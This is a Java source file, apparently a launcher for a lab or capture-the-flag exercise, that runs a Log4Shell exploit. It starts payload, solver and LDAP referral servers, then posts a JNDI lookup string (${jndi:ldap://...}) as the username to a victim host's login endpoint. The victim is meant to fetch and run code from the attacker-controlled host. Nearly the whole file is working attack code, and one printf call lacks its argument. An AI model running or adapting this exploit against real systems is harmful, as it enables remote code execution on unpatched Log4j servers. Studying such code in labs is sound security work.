import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class Launcher {
	private static final String HACKERLAB_HOST = "scl-fyp-infra-forwarder";
	private static final String VICTIM_HOST = "dashboard";

	public static void main(String[] args) {
		new PayloadHTTPServer().start();
		new Solver().start();
		new LDAPRefServer().start();
		new Thread(() -> {
			try {
				System.err.println("!! Waiting for 1 second to get ready");
				Thread.sleep(1000);
				System.err.printf("!! POSTing Log4j payload%n%s%n");
				HttpClient client = HttpClient.newHttpClient();
				client.send(HttpRequest
					.newBuilder()
					.uri(URI.create(String.format("http://%s/auth/login", VICTIM_HOST)))
					.header("Content-Type", "application/x-www-form-urlencoded")
					.POST(HttpRequest.BodyPublishers.ofString(String.format("username=${jndi:ldap://%s/exex}&password=boof", HACKERLAB_HOST)))
					.build(), HttpResponse.BodyHandlers.ofString());
			} catch (Exception e) {
				throw new RuntimeException(e);
			}
		}).start();
	}
}
